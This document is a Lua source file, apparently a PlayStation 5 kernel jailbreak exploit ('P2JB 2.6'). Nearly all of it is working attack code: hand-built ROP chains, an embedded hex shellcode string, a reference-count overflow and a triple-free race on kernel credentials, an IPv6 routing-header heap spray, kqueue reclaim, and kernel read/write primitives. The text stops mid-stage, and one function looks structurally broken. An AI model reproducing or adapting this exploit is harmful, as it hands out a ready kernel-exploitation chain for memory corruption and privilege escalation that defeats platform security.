-- p2jb implementation
-- based on poops_ps5.lua and p2jb.c by Gezine edited by Doplx
-- based on poops.lua (ps4) by egycnq

p2jb_version_string = "P2JB 2.6"

local UCRED_SIZE          = 360
local RTHDR_TAG           = 0x13370000
local MSG_IOV_NUM         = 23
local IOV_THREAD_NUM      = 4
local UIO_THREAD_NUM      = 4
local UIO_IOV_COUNT       = 20
local UIO_SYSSPACE        = 1
local TRIPLEFREE_ATTEMPTS = 8
local MAX_ROUNDS_TWIN     = 10
local MAX_ROUNDS_TRIPLET  = 500
local FIND_TRIPLET_FAST   = 2000
local UMTX_OP_WAIT        = 2
local UMTX_OP_WAKE        = 3
local UMTX_OP_SYSNUM      = 0x1c6
local SYSTEM_AUTHID        = 0x4800000000010003
local FREE_FDS_NUM      = 0x10

local EXEC_SHELLCODE = "4885f6743641544989fc554889f55331db66662e0f1f8400000000000f1f400048bf00000000008000004883c30141ffd44839dd75ea5b5d415cc3c3"

-- Syscall wrapper helper
local function get_syscall_wrapper(num)
    if PLATFORM == "PS4" then
        return syscall.syscall_wrapper[num]
    else
        return syscall.syscall_address
    end
end


local function create_worker_sync(count)
    local raw = malloc(8 + count * 8 + 128)
    local aligned = raw + (64 - (raw % 64)) % 64
    write64(aligned, 0)
    for i = 0, count - 1 do write64(aligned + 0x08 + i * 8, 0) end
    return { cmd = aligned, finished = aligned + 0x08, total = count, gen = 0 }
end

local function signal_workers(ws)
    for i = 0, ws.total - 1 do write64(ws.finished + i * 8, 0) end
    ws.gen = ws.gen + 1
    write64(ws.cmd, ws.gen)
    syscall.umtx_op(ws.cmd, UMTX_OP_WAKE, 0x7FFFFFFF, 0, 0)
end

local function wait_workers(ws)
    while true do
        local done = true
        for i = 0, ws.total - 1 do
            if read64(ws.finished + i * 8) == 0 then done = false; break end
        end
        if done then return end
        syscall.sched_yield()
    end
end

local function spawn_rop_worker(ws, wid, name, fd, iov_ptr, sysnum, wrapper, scratch, mask, rtbuf, cpuset_wrapper, rtprio_wrapper)
    local a_slj = dlsym(LIBKERNEL_HANDLE, "siglongjmp")
    local a_pc  = dlsym(LIBKERNEL_HANDLE, "scePthreadCreate")
    local a_ai  = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrInit")
    local a_ad  = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrDestroy")
    local a_as  = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrSetstacksize")
    local fPC = func_wrap(a_pc)
    local fAI = func_wrap(a_ai)
    local fAD = func_wrap(a_ad)
    local fAS = func_wrap(a_as)

    local cb = malloc(0x8000)
    cb = cb + (16 - (cb % 16)) % 16
    local idx = 0
    local function p(v) write64(cb + idx * 8, v); idx = idx + 1 end

    p(RET); p(POP_RBX_RET); p(scratch)

    -- pin thread to cpu + set realtime priority
    p(POP_RDI_RET); p(3); p(POP_RSI_RET); p(1)
    p(POP_RDX_RET); p(0xFFFFFFFFFFFFFFFF)
    p(POP_R8_RET); p(mask); p(0); p(0); p(0)
    p(POP_RCX_RET); p(0x10); p(POP_RAX_RET); p(0x1E8); p(cpuset_wrapper)
    p(POP_RDI_RET); p(1); p(POP_RSI_RET); p(0)
    p(POP_RDX_RET); p(rtbuf); p(POP_RAX_RET); p(0x1D2); p(rtprio_wrapper)

    -- main loop: wait on umtx, execute syscall, signal done
    local loop_start = idx
    p(POP_RBX_RET); p(scratch)
    p(POP_RDI_RET); p(ws.cmd); p(POP_RSI_RET); p(UMTX_OP_WAIT)
    local wait_val_slot = idx
    p(POP_RDX_RET); p(0); p(POP_RCX_RET); p(0)
    p(POP_R8_RET); p(0); p(0); p(0); p(0)
    p(POP_RAX_RET); p(UMTX_OP_SYSNUM); p(get_syscall_wrapper(0x1c6))

    p(POP_RAX_RET); p(ws.cmd); p(MOV_RAX_DEREF_RAX_RET)
    p(POP_RDI_RET); p(cb + (wait_val_slot + 1) * 8); p(MOV_DEREF_RDI_RAX_RET)

    -- issue the actual work syscall
    p(POP_RDI_RET); p(fd); p(POP_RSI_RET); p(iov_ptr)
    local iov_count = sysnum == 0x1B and 0 or UIO_IOV_COUNT
    local slot_pop_rdx = idx; p(POP_RDX_RET)
    local slot_count   = idx; p(iov_count)
    local slot_pop_rax = idx; p(POP_RAX_RET)
    local slot_sysnum  = idx; p(sysnum)
    local slot_wrapper = idx; p(wrapper)

    -- signal finished
    local emit_wf = function(addr, val)
        p(POP_RAX_RET); p(val); p(POP_RDI_RET); p(addr); p(MOV_DEREF_RDI_RAX_RET)
    end
    emit_wf(ws.finished + wid * 8, 1)

    -- wake main thread
    p(POP_RBX_RET); p(scratch)
    p(POP_RDI_RET); p(ws.finished + wid * 8); p(POP_RSI_RET); p(UMTX_OP_WAKE)
    p(POP_RDX_RET); p(0x7FFFFFFF); p(POP_RCX_RET); p(0)
    p(POP_R8_RET); p(0); p(0); p(0); p(0)
    p(POP_RAX_RET); p(UMTX_OP_SYSNUM); p(get_syscall_wrapper(0x1c6))

    -- self-repair clobbered slots (ps5 recvmsg EFAULT)
    p(POP_RDI_RET); p(cb + slot_pop_rdx * 8); p(POP_RAX_RET); p(POP_RDX_RET); p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_count * 8);   p(POP_RAX_RET); p(iov_count);   p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_pop_rax * 8); p(POP_RAX_RET); p(POP_RAX_RET); p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_sysnum * 8);  p(POP_RAX_RET); p(sysnum);      p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_wrapper * 8); p(POP_RAX_RET); p(wrapper);      p(MOV_DEREF_RDI_RAX_RET)

    p(POP_RSP_RET); p(cb + loop_start * 8)

    -- launch via siglongjmp
    local jb = malloc(0x60)
    for i = 0, 0x58, 8 do write64(jb + i, 0) end
    write64(jb, RET)
    write64(jb + 0x10, cb)

    local at = malloc(0x100); fAI(at); fAS(at, 0x10000)
    local th = malloc(8); write64(th, 0)
    fPC(th, at, a_slj, jb, name)
    fAD(at)
end


local function build_rthdr(buf, target_size)
    local segments = (((target_size >> 3) - 1) & 0xFFFFFFFE)
    write8(buf, 0)
    write8(buf + 1, segments)
    write8(buf + 2, 0)
    write8(buf + 3, segments >> 1)
    return (segments + 1) << 3
end

function p2jb_ps5()
    send_notification(p2jb_version_string)

    if not fw_offsets then
        send_notification("Update Luac0re to at least 2.2d version")
        return
    end

    if gpu.close or kill_app then
        send_notification("Update Luac0re to at least 2.2d version")
        return
    end

    if PLATFORM ~= "PS5" then
        send_notification("Unsupported platform  " .. PLATFORM)
        return
    end

    if tonumber(FW_VERSION) > 12.70 then
        send_notification("Unsupported fw " .. FW_VERSION)
        return
    end

    local OFF = get_offsets(tostring(FW_VERSION))
    if not OFF then
        send_notification("Unsupported fw " .. FW_VERSION)
        return
    end

    local DEBUG_MODE = kkread32 ~= nil
    if not DEBUG_MODE then
        if is_jailbroken() then
            send_notification("Already Jailbroken")
            return
        end

        if file_exists("/savedata0/lua/elf_jb/elfldr_1200.elf") then
            send_notification("Update Luac0re to at least 2.2d version")
            return
        end

        local failcheck_path = "/" .. get_nidpath() .. "/common_temp/p2jb.fail"
        if file_exists(failcheck_path) or file_exists("/user/temp/common_temp/p2jb.fail") then
            send_notification("Restart your PS5 to run exploit again");
            return
        end

        file_write(failcheck_path, "")
    end

    init_dlsym()

    syscall.resolve({
        read = 0x3, write = 0x4, close = 0x6, dup = 0x29, pipe = 0x2a,
        setuid = 0x17, netcontrol = 0x63, sched_yield = 0x14B,
        recvmsg = 0x1B, cpuset_setaffinity = 0x1E8, rtprio_thread = 0x1D2,
        sendto = 0x85, fcntl = 0x5C, kqueue = 0x16A,
        readv = 0x78, writev = 0x79, getpid = 0x14, nmount = 0x17A,
        ioctl = 0x36,
    })

    local fPC = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadCreate"))
    local fAI = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrInit"))
    local fAD = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrDestroy"))
    local fAS = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrSetstacksize"))
    local fCpuset = func_wrap(dlsym(LIBKERNEL_HANDLE, "cpuset_setaffinity"))
    local fRtprio = func_wrap(dlsym(LIBKERNEL_HANDLE, "rtprio_thread"))

    local kqueueex_addr = dlsym(LIBKERNEL_HANDLE, "__sys_kqueueex")
    write_shellcode(SHELLCODE_BASE, EXEC_SHELLCODE)
    local exec_ntimes = func_wrap(SHELLCODE_BASE)

    -- syscall wrappers for ROP chains
    local w_recvmsg = get_syscall_wrapper(0x1B)
    local w_cpuset  = get_syscall_wrapper(0x1E8)
    local w_rtprio  = get_syscall_wrapper(0x1D2)
    local w_readv   = get_syscall_wrapper(0x78)
    local w_writev  = get_syscall_wrapper(0x79)

    local scratch     = malloc(16)
    local scratch_big = malloc(0x4000)
    for i = 0, 56, 8 do write64(scratch_big + i, 0) end

    local dummy_byte     = malloc(8)
    local len_out        = malloc(4)
    local rthdr_readback = malloc(360)
    for i = 0, 248, 8 do write64(rthdr_readback + i, 0) end

    local DELAY_SHORT  = malloc(16); write64(DELAY_SHORT, 0);  write64(DELAY_SHORT + 8, 10 * 1000)    -- 10ms
    local DELAY_MEDIUM = malloc(16); write64(DELAY_MEDIUM, 0); write64(DELAY_MEDIUM + 8, 50 * 1000)   -- 50ms
    local DELAY_SETTLE = malloc(16); write64(DELAY_SETTLE, 0); write64(DELAY_SETTLE + 8, 100 * 1000) -- 100ms

    -- cpu pinning
    local cpu_mask = malloc(16)
    for i = 0, 15 do write8(cpu_mask + i, 0) end
    write16(cpu_mask, 0x10)
    fCpuset(3, 1, 0xFFFFFFFFFFFFFFFF, 16, cpu_mask)
    local rt_params = malloc(4)
    write16(rt_params, 2); write16(rt_params + 2, 256)
    fRtprio(1, 0, rt_params)

    -- socket pairs for worker communication

    local function create_pipe_pair()
        local buf = malloc(8); write64(buf, 0)
        local ret = syscall.pipe(buf)
        local rfd, wfd = read32(buf), read32(buf + 4)
        if rfd == 0 and wfd == 0 and ret > 0 then rfd = ret; wfd = ret + 1 end
        return rfd, wfd
    end

    local uio_sv = malloc(8); syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sv)
    local uio_sock_a = read32(uio_sv)
    local uio_sock_b = read32(uio_sv + 4)

    local iov_sv = malloc(8); syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sv)
    local iov_sock_a = read32(iov_sv)
    local iov_sock_b = read32(iov_sv + 4)

    -- Worker iovec/uio buffers

    local recvmsg_iovecs = malloc(MSG_IOV_NUM * 16)
    for i = 0, MSG_IOV_NUM * 16 - 1, 8 do write64(recvmsg_iovecs + i, 0) end
    write64(recvmsg_iovecs, 1); write64(recvmsg_iovecs + 8, 1)

    local recvmsg_hdr = malloc(0x38)
    for i = 0, 0x30, 8 do write64(recvmsg_hdr + i, 0) end
    write64(recvmsg_hdr + 0x10, recvmsg_iovecs)
    write64(recvmsg_hdr + 0x18, MSG_IOV_NUM)

    local uio_read_buf = malloc(64)
    for i = 0, 56, 8 do write64(uio_read_buf + i, 0x4141414141414141) end
    local uio_write_buf = malloc(64)
    for i = 0, 56, 8 do write64(uio_write_buf + i, 0) end

    local uio_iov_read = malloc(UIO_IOV_COUNT * 16)
    for i = 0, UIO_IOV_COUNT * 16 - 1, 8 do write64(uio_iov_read + i, 0) end
    write64(uio_iov_read, uio_read_buf); write64(uio_iov_read + 8, 8)

    local uio_iov_write = malloc(UIO_IOV_COUNT * 16)
    for i = 0, UIO_IOV_COUNT * 16 - 1, 8 do write64(uio_iov_write + i, 0) end
    write64(uio_iov_write, uio_write_buf); write64(uio_iov_write + 8, 8)

    local kread_result_bufs = {}
    for i = 1, UIO_THREAD_NUM do kread_result_bufs[i] = malloc(64) end
    local kread_sndbuf = malloc(4)
    local kwrite_sndbuf = malloc(4)

    -- pipe pairs for kernel r/w primitive

    local master_rfd, master_wfd = create_pipe_pair()
    local victim_rfd, victim_wfd = create_pipe_pair()
    syscall.fcntl(master_rfd, 4, 4); syscall.fcntl(master_wfd, 4, 4)
    syscall.fcntl(victim_rfd, 4, 4); syscall.fcntl(victim_wfd, 4, 4)
    ulog("pipes master=" .. master_rfd .. "," .. master_wfd .. " victim=" .. victim_rfd .. "," .. victim_wfd)

    -- Worker thread setup

    local iov_workers       = create_worker_sync(IOV_THREAD_NUM)
    local uio_read_workers  = create_worker_sync(UIO_THREAD_NUM)
    local uio_write_workers = create_worker_sync(UIO_THREAD_NUM)

    for i = 1, IOV_THREAD_NUM do
        spawn_rop_worker(iov_workers, i - 1, "iov" .. i,
            iov_sock_a, recvmsg_hdr, 0x1B, w_recvmsg,
            scratch, cpu_mask, rt_params, w_cpuset, w_rtprio)
    end
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_read_workers, i - 1, "uior" .. i,
            uio_sock_b, uio_iov_read, 0x79, w_writev,
            scratch, cpu_mask, rt_params, w_cpuset, w_rtprio)
    end
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_write_workers, i - 1, "uiow" .. i,
            uio_sock_a, uio_iov_write, 0x78, w_readv,
            scratch, cpu_mask, rt_params, w_cpuset, w_rtprio)
    end

    local active_uio_mode = 0

    local function signal_iov()  signal_workers(iov_workers) end
    local function wait_iov()    wait_workers(iov_workers) end

    local function signal_uio(mode)
        active_uio_mode = mode
        if mode == 0 then signal_workers(uio_read_workers) else signal_workers(uio_write_workers) end
    end
    local function wait_uio()
        if active_uio_mode == 0 then wait_workers(uio_read_workers) else wait_workers(uio_write_workers) end
    end

    -- IPv6 rthdr spray

    local ipv6_sockets = {}
    local ipv6_count = 0
    for i = 1, 64 do
        local fd = create_socket(AF_INET6, SOCK_STREAM, 0)
        if fd < 0 then break end
        ipv6_sockets[i] = fd
        ipv6_count = i
    end
    for i = 1, ipv6_count do
        syscall.setsockopt(ipv6_sockets[i], IPPROTO_IPV6, 51, 0, 0)
    end
    syscall.nanosleep(DELAY_MEDIUM, 0)

    local rthdr_spray = malloc(UCRED_SIZE)
    for i = 0, UCRED_SIZE - 1, 8 do write64(rthdr_spray + i, 0) end
    local rthdr_spray_len = build_rthdr(rthdr_spray, UCRED_SIZE)

    local function set_rthdr(sock, buf, len)
        return syscall.setsockopt(sock, IPPROTO_IPV6, 51, buf, len)
    end
    local function get_rthdr(sock, buf, len_ptr)
        return syscall.getsockopt(sock, IPPROTO_IPV6, 51, buf, len_ptr)
    end
    local function free_rthdr(sock)
        return syscall.setsockopt(sock, IPPROTO_IPV6, 51, 0, 0)
    end

    local tag_buf = malloc(16)
    local tag_len = malloc(4)

    local function find_twins(max_rounds)
    for round = 1, max_rounds do
        for i = 0, ipv6_count - 1 do
            write32(rthdr_spray + 4, RTHDR_TAG + i)
            set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
        end
        for i = 0, ipv6_count - 1 do
            write32(tag_len, 8) -- Limit search range
            if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
                local val = read32(tag_buf + 4)
                local j = val & 0xFFFF
                if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
                    return { i, j } -- Found twins
                end
            end
        end
        if round % 5 == 0 then syscall.sched_yield() end -- Fewer yields
    end
    return nil
    end

    local function find_triplet(master_idx, exclude_idx, max_rounds)
        for round = 1, max_rounds do
            for i = 0, ipv6_count - 1 do
                if i ~= master_idx and i ~= exclude_idx then
                    write32(rthdr_spray + 4, RTHDR_TAG + i)
                    set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
                end
            end
            write32(tag_len, 8)
            if get_rthdr(ipv6_sockets[master_idx + 1], tag_buf, tag_len) >= 0 then
                local val = read32(tag_buf + 4)
                local j = val & 0xFFFF
                if (val & 0xFFFF0000) == RTHDR_TAG and j ~= master_idx and j ~= exclude_idx and j < ipv6_count then
                    return j
                end
            end
            if round % 100 == 0 then syscall.sched_yield() end
        end
        return -1
    end

    -- Triplet state management

    local triplets = { -1, -1, -1 }

    local function triplets_valid()
        return triplets[1] >= 0 and triplets[2] >= 0 and triplets[3] >= 0
            and triplets[2] < ipv6_count and triplets[3] < ipv6_count
    end

    local function repair_triplets()
        if triplets[2] < 0 or triplets[2] >= ipv6_count then
            for attempt = 1, 5 do
                triplets[2] = find_triplet(triplets[1], triplets[3], FIND_TRIPLET_FAST)
                if triplets[2] ~= -1 then break end
                syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
            end
        end
        if triplets[3] < 0 or triplets[3] >= ipv6_count then
            for attempt = 1, 5 do
                triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
                if triplets[3] ~= -1 then break end
                syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
            end
        end
        return triplets_valid()
    end

    -- slow kernel r/w (via uio/iov race)

    local function build_uio(buf, iov_ptr, td, is_read, kaddr, size)
        write64(buf,      iov_ptr)
        write64(buf + 8,  UIO_IOV_COUNT)
        write64(buf + 16, 0xFFFFFFFFFFFFFFFF)
        write64(buf + 24, size)
        write32(buf + 32, UIO_SYSSPACE)
        write32(buf + 36, is_read and 1 or 0)
        write64(buf + 40, td)
        write64(buf + 48, kaddr)
        write64(buf + 56, size)
    end

    local function kread_slow(kaddr, size)
        if not triplets_valid() then return nil end

        for i = 0, 56, 8 do write64(uio_read_buf + i, 0x4141414141414141) end
        for i = 1, UIO_THREAD_NUM do
            for j = 0, size - 1 do write8(kread_result_bufs[i] + j, 0) end
        end

        write32(kread_sndbuf, size)
        syscall.setsockopt(uio_sock_b, SOL_SOCKET, 0x1001, kread_sndbuf, 4)
        syscall.write(uio_sock_b, scratch_big, size)
        write64(uio_iov_read + 8, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_sockets[triplets[2] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local uio_iters = 0
        while true do
            signal_uio(0); syscall.sched_yield()
            write32(len_out, 16)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 8) == UIO_IOV_COUNT then break end
            syscall.read(uio_sock_a, scratch_big, size)
            for i = 1, UIO_THREAD_NUM do syscall.read(uio_sock_a, kread_result_bufs[i], size) end
            wait_uio()
            syscall.write(uio_sock_b, scratch_big, size)
            uio_iters = uio_iters + 1
            if uio_iters > 2000 then return nil end
        end

        local leaked_iov = read64(rthdr_readback)
        if leaked_iov == 0 or (leaked_iov >> 48) ~= 0xFFFF then return nil end

        build_uio(recvmsg_iovecs, leaked_iov, 0, true, kaddr, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_sockets[triplets[3] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local iov_iters = 0
        while true do
            signal_iov()
            for _ = 1, 5 do syscall.sched_yield() end
            write32(len_out, 64)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 32) == UIO_SYSSPACE then break end
            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return nil end
        end

        syscall.read(uio_sock_a, scratch_big, size)
        local result = nil
        for i = 1, UIO_THREAD_NUM do
            syscall.read(uio_sock_a, kread_result_bufs[i], size)
            local v = read64(kread_result_bufs[i])
            if v ~= 0x4141414141414141 then
                local t = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
                if t == -1 then
                    wait_uio()
                    syscall.write(iov_sock_b, scratch_big, 1)
                    wait_iov()
                    syscall.read(iov_sock_a, dummy_byte, 1)
                    triplets[2] = find_triplet(triplets[1], triplets[3], FIND_TRIPLET_FAST)
                    return nil
                end
                triplets[2] = t
                result = kread_result_bufs[i]
            end
        end
        wait_uio()
        syscall.write(iov_sock_b, scratch_big, 1)

        if not result then
            wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
            return nil
        end

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[3] == -1 then
            wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
            return nil
        end

        wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
        return result
    end

    local function kwrite_slow(kaddr, data, data_size)
        if not triplets_valid() then return false end

        write32(kwrite_sndbuf, data_size)
        syscall.setsockopt(uio_sock_b, SOL_SOCKET, 0x1001, kwrite_sndbuf, 4)
        write64(uio_iov_write + 8, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_sockets[triplets[2] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local uio_iters = 0
        while true do
            signal_uio(1); syscall.sched_yield()
            write32(len_out, 16)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 8) == UIO_IOV_COUNT then break end
            for i = 1, UIO_THREAD_NUM do syscall.write(uio_sock_b, data, data_size) end
            wait_uio()
            uio_iters = uio_iters + 1
            if uio_iters > 2000 then return false end
        end

        local leaked_iov = read64(rthdr_readback)
        if leaked_iov == 0 or (leaked_iov >> 48) ~= 0xFFFF then return false end

        build_uio(recvmsg_iovecs, leaked_iov, 0, false, kaddr, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_sockets[triplets[3] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local iov_iters = 0
        while true do
            signal_iov()
            for _ = 1, 5 do syscall.sched_yield() end
            write32(len_out, 64)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 32) == UIO_SYSSPACE then break end
            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return false end
        end

        for i = 1, UIO_THREAD_NUM do syscall.write(uio_sock_b, data, data_size) end

        for attempt = 1, 5 do
            triplets[2] = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
            if triplets[2] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[2] == -1 then return false end

        wait_uio()
        syscall.write(iov_sock_b, scratch_big, 1)

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[3] == -1 then return false end

        wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
        return true
    end

    local function kslow64(kaddr)
        for attempt = 1, 3 do
            if triplets_valid() then
                local buf = kread_slow(kaddr, 8)
                if buf then
                    local val = read64(buf)
                    if val ~= 0 then
                        if (val >> 48) == 0xFFFF then return val end
                        if (val >> 40) ~= 0 then return val end
                    end
                end
            end
            repair_triplets(); syscall.sched_yield()
        end
        return nil
    end

    show_dialog("Stage Patience\nPlease wait for some time (~10 Second)")
    local ucred = 0
    local free_fds = {}
    local free_fd_idx = 1

    local function prepare_fds(debug_cr_ref)
        -- Create clean ucred without any additional references
        syscall.setuid(1)
        -- Allow new ucred to settle where it needs to settle
        sleep(10)

        local cr_ref_before = 0
        local cr_ref_after = 0
        local cr_ref_after_files = 0
        local cr_ref_final = 0
        if debug_cr_ref then
            ucred = kernel_get_proc_ucred(syscall.getpid())
            cr_ref_before = kkread32(ucred)
        end

        -- Increment cr_ref by one with overflow
        -- We want first fd free to be a normal free
        local ntimes = 0x100000001 - FREE_FDS_NUM
        if debug_cr_ref then
            local ntimes_debug = 0x1000000
            local cr_ref_after_increment = cr_ref_before + ntimes - ntimes_debug
            kkwrite32(ucred, cr_ref_after_increment)
            exec_ntimes(kqueueex_addr, ntimes_debug)
            cr_ref_after = kkread32(ucred)
        else
            exec_ntimes(kqueueex_addr, ntimes)
        end

        -- Use fopen to get the rest of the cr_ref increment
        for i = 1, FREE_FDS_NUM do
            free_fds[i] = syscall.open("/dev/null")
        end

        if debug_cr_ref then
            cr_ref_after_files = kkread32(ucred)
        end

        -- Replace ucred, freeing all extra references from old ucred
        syscall.setuid(1)
        -- Allow new ucred to settle where it needs to settle
        sleep(10)

        if debug_cr_ref then
            cr_ref_final = kkread32(ucred)
            printf("cr_ref before: %s", to_hex(cr_ref_before))
            printf("cr_ref after: %s", to_hex(cr_ref_after))
            printf("cr_ref after files: %s", to_hex(cr_ref_after_files))
            printf("cr_ref final: %s", to_hex(cr_ref_final))
        end
    end

    local function free_one_fd()
        syscall.close(free_fds[free_fd_idx])
        free_fd_idx = free_fd_idx + 1
    end

    prepare_fds(DEBUG_MODE)

    -- Stage 0: Triple-free race
    send_notification("Stage 0\nTriple-free race")
    local race_success = false

    local function attempt_race()
    for i = 1, ipv6_count do free_rthdr(ipv6_sockets[i]) end

    -- Free ucred first time
    free_one_fd()

    -- Flush iov workers to stabilize
    for _ = 1, 16 do -- Fewer iterations
        signal_iov()
        syscall.write(iov_sock_b, scratch_big, 1)
        wait_iov()
        syscall.read(iov_sock_a, dummy_byte, 1)
    end

    -- Free ucred second time
    free_one_fd()

    -- Attempt twin & triplet allocations with reduced loops
    local twins = find_twins(MAX_ROUNDS_TWIN)
    if not twins then
        print("failed to find twins")
        return false
    end

    free_rthdr(ipv6_sockets[twins[2] + 1])
    syscall.sched_yield(); syscall.sched_yield()
    local reclaimed = false

    local verify_buf = malloc(UCRED_SIZE)
    local verify_len = malloc(4)

    for _ = 1, MAX_ROUNDS_TRIPLET do -- Reduced loop for triplet
        signal_iov()
        syscall.sched_yield()
        write32(verify_len, 8)
        syscall.getsockopt(ipv6_sockets[twins[1] + 1], verify_buf, verify_len)
        if read32(verify_buf) == 1 then reclaimed = true; break end
        syscall.write(iov_sock_b, scratch_big, 1)
        wait_iov()
        syscall.read(iov_sock_a, dummy_byte, 1)
    end
    return reclaimed
    end
        triplets[1] = twins[1]

        -- Free ucred third time
        free_one_fd()
        syscall.sched_yield()

        triplets[2] = find_triplet(triplets[1], -1, MAX_ROUNDS_TRIPLET)
        if triplets[2] == -1 then
            print("triplets[2] == -1")
            return false
        end

        syscall.write(iov_sock_b, scratch_big, 1)
        triplets[3] = find_triplet(triplets[1], triplets[2], MAX_ROUNDS_TRIPLET)
        wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
        if triplets[3] == -1 then
            print("triplets[3] == -1")
            return false
        end

        return true
    end

    for attempt = 1, TRIPLEFREE_ATTEMPTS do
        if attempt_race() then
            race_success = true
            ulog("[0] triplets " .. triplets[1] .. "," .. triplets[2] .. "," .. triplets[3])
            break
        end
        syscall.nanosleep(DELAY_SHORT, 0)
    end

    if not race_success then error("[0] race failed"); return nil end
    syscall.nanosleep(DELAY_MEDIUM, 0)

    -- Stage 1: Kqueue reclaim
    send_notification("Stage 1\nKqueue reclaim")

    free_rthdr(ipv6_sockets[triplets[2] + 1])
    syscall.sched_yield(); syscall.sched_yield()

    local proc_filedesc = 0
    local kq_found = false
    local kq_batch = {}

    for _ = 1, 5000 do
        local kq = syscall.kqueue()
        if kq < 0 then
            for _, fd in ipairs(kq_batch) do syscall.close(fd) end
            kq_batch = {}; syscall.sched_yield()
        else
            kq_batch[#kq_batch + 1] = kq
            write32(len_out, 256)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)

            if read32(rthdr_readback + 8) == 0x1430000 and read64(rthdr_readback + OFF.KQ_FDP) ~= 0 then
                kq_found = true
                for _, fd in ipairs(kq_batch) do if fd ~= kq then syscall.close(fd) end end
                proc_filedesc = read64(rthdr_readback + OFF.KQ_FDP)
                syscall.close(kq)
                break
            end

            if #kq_batch >= 8 then
                for _, fd in ipairs(kq_batch) do syscall.close(fd) end
                kq_batch = {}; syscall.sched_yield()
            end
        end
    end

    if not kq_found then
        for _, fd in ipairs(kq_batch) do syscall.close(fd) end
        error("[1] kqueue reclaim failed"); return nil
    end

    if (proc_filedesc >> 48) ~= 0xFFFF then error("[1] bad filedesc pointer"); return nil end
    ulog("[1] proc_filedesc=" .. to_hex(proc_filedesc))

    for _ = 1, 3 do
        triplets[2] = find_triplet(triplets[1], triplets[3], 50000)
        if triplets[2] ~= -1 then break end
        syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
    end
    if triplets[2] == -1 then error("[1] triplet repair failed"); return nil end

    -- Stage 2: Leak pipe data pointers
    send_notification("Stage 2\nLeak pipe data pointers")
    ulog("[2] leaking pipe pointers...")

    local fd_ofiles
    local master_fp, victim_fp
    local master_pipe_data, victim_pipe_data
    local stage2_ok = false

    for attempt = 1, 5 do
        repair_triplets(); syscall.nanosleep(DELAY_SETTLE, 0)

        local fdescenttbl = kslow64(proc_filedesc + OFF.FILEDESC_OFILES)
        if fdescenttbl then
            fd_ofiles = fdescenttbl + OFF.FDESCENTTBL_HDR
            repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

            master_fp = kslow64(fd_ofiles + master_rfd * OFF.FILEDESCENT_SIZE)
            if master_fp then
                repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                victim_fp = kslow64(fd_ofiles + victim_rfd * OFF.FILEDESCENT_SIZE)
                if victim_fp then
                    repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                    master_pipe_data = kslow64(master_fp)
                    if master_pipe_data then
                        repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                        victim_pipe_data = kslow64(victim_fp)
